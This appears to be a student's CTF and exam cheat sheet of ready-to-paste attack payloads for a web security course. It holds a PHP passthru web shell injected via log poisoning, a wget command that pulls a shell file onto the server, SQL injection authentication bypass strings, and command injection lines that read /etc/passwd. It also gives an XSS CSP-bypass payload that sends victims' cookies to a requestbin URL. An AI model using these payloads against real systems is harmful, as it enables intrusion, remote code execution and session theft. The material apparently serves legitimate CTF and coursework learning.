# 6843 CMDS + PAYLOADS  
Copy pasta some quick access commands + payloads for CTF challenges + exam.  

---
### Security Setup
---

**EC2 Web Server**
1. Launch HTTP server `python -m SimpleHTTPServer 80`
2. Hit it with requests / capture some admin cookies :)

**Alternatives to capture requests**
* https://requestbin.fullcontact.com/
* http://webhookinbox.com/

---
### Common 6843 words
---
Port Numbers, Directories, Subdomains, Files... be imaginative.
```
noone
sketch
sketchy
9447 / 6841 / 6441
robots.txt
flag
```

---
### Recon: Network Mapping
---

**Nslookup**
```
Reverse DNS query:
nslookup [ hostname/ip ]
```

**Nmap**
```
Aggressive service/OS detection:
nmap -sV --version-intensity 5 [ hostname/ip ]

Scan all ports:
nmap -p- [ hostname/ip ]

Scan most common ports (fast):
nmap -F [ hostname/ip ]

Increase Verbosity / Debugging:
nmap -vv OR -dd [ hostname/ip ]
```


---
### Recon: Subdomain Bruteforcing
---

**Aquatone**
```
aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
```
**GoBuster DNS Mode**
```
See below instructions @ dir bruteforcing.
go run main.go -m dns -u [ https://ns.agency ] -w /path/to/wordlist      // run subdomain bruteforcing
```
---
### Recon: Directory Bruteforcing
---

**GoBuster**
```
cd /Users/brianlam/go/src/gobuster                  // go to gobuster sources
go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.wordlist    // run dir bruteforcing
```

---
### Local/Remote File Inclusion
---  

STEP #1: Verify existence of LFI/LFD vulnerability.
```
domain.com/?p=somepage.txt
domain.com/?p=pagename-whatever
domain.com/?class=something&function=another 
```

STEP #2: Figure out where the logfiles are. Example locations:
```
// PHP Logfiles:
/usr/local/etc/php
/etc/php.d/*.ini
/etc/php5/cli/php.ini
/usr/local/lib/php.ini
/etc/php.ini
  
// Apache Logfiles:
/var/log/apache2/access.log
/var/log/httpd/error_log
/var/log/apache2/error.log
/var/log/httpd-error.log
```

STEP #3: Inject a payload into the logfile:

  * _PHP passthru() function_: Execute an external program and display raw output
  * Attack vectors:
     * URL query string: `example.com/?q=injectpaylod`
     * HTTP Headers: Referer header.
```
<?php passthru($_GET['cmd']); ?>
<?php passthru(['ls -l']); ?>
```

STEP #4: With command execution, use wget to upload your own files to the server:
```
/var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
OR
<?php passthru(['w']); ?>
```

Another LFI / LFI->RCE Cheatsheet:  
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal

---
### SQLi
---

**Authentication Bypass**
```
admin' --
' or 1=1--
' or '1'='1
' or '1'='1 --
```

**Verification: Blind SQLi**
```
%' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
%' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
```

**Sqlmap Commands**
```
Enumerate everything:
python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap
-a --level=3

Enumerate a specific database:
python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
```

---
### Other/Advanced Injection
---

**Command Injection**
Examples:
```
http://shitesite/lol.php?path=cat%20/etc/passwd
http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
```  
Injection via. chaining:  
```
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls    // Only if the first cmd fail
```  
Execution inside another command:  
```
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```  

**Template Injection**


---
### XML External Entities
---  
```

```
---
### XSS Normal + Advanced
---
**Useful JS web API methods for XSS**  
Redirect a user/admin to your url to steal their cookies.
```
fetch()
window.onload()
document.location()
window.location.replace()
window.location.reload()
window.location.assign()
```

**CSP Bypass**  
Bypass via. JSONP API callback param:
```
Verify:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>

Payload Original:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>

Payload Step #1 => Encode x1:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>

Payload Step #2 => Encode x2:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>

Note:
- Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
```


---
### Server-Side Request Forgery
---
Summary: Attacker can make requests from a server to target its internal systems (i.e intranet) by bypassing its firewalls.




